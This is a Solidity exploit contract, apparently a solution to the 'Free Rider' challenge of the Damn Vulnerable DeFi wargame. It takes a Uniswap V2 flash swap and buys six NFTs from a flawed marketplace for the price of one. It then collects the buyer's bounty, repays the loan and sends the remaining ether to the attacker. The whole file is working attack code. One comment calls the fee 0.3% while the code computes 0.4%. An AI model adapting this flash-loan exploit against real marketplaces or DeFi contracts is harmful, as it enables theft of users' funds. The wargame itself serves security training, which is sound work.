//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../free-rider/FreeRiderBuyer.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../DamnValuableNFT.sol";

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint256 wad) external;
}

contract FreeRiderAttack is IERC721Receiver {
    FreeRiderBuyer buyer;
    FreeRiderNFTMarketplace marketplace;
    IUniswapV2Pair pair;
    IWETH weth;
    DamnValuableNFT nftToken;
    uint256 constant PRICE = 15 ether;

    constructor(
        address _freeRiderBuyerAddress,
        address payable _freeRiderNFTMarketplaceAddress,
        address _uniswapV2PairAddress,
        address payable _wethAddress
    ) {
        buyer = FreeRiderBuyer(_freeRiderBuyerAddress);
        marketplace = FreeRiderNFTMarketplace(_freeRiderNFTMarketplaceAddress);
        pair = IUniswapV2Pair(_uniswapV2PairAddress);
        weth = IWETH(_wethAddress);
        nftToken = DamnValuableNFT(marketplace.token());
    }

    function attack() public {
        // take out flash loan
        uint256 amount0Out = PRICE; // WETH
        uint256 amount1Out = 0; // DVT
        address to = address(this);
        bytes memory data = "0x1";

        pair.swap(amount0Out, amount1Out, to, data);

        // transfer ether payout to attacker
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Payout transfer failed.");
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "Invalid msg.sender");
        require(IERC20(weth).balanceOf(address(this)) == PRICE, "Didnt receive WETH loan");

        // unwrap weth
        IWETH(weth).withdraw(PRICE);

        // buy nfts
        buyNfts();

        // send nfts to buyer
        for (uint256 i = 0; i < 6; i++) {
            nftToken.safeTransferFrom(address(this), address(buyer), i);
        }

        // pay back loan with payout received from buyer
        uint256 fee = (amount0 * 4) / 1000; // 0.3% fee
        IWETH(weth).deposit{value: PRICE + fee}();
        IERC20(weth).transfer(address(pair), PRICE + fee);
    }

    function buyNfts() private {
        // buy all 6 NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: PRICE}(tokenIds);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
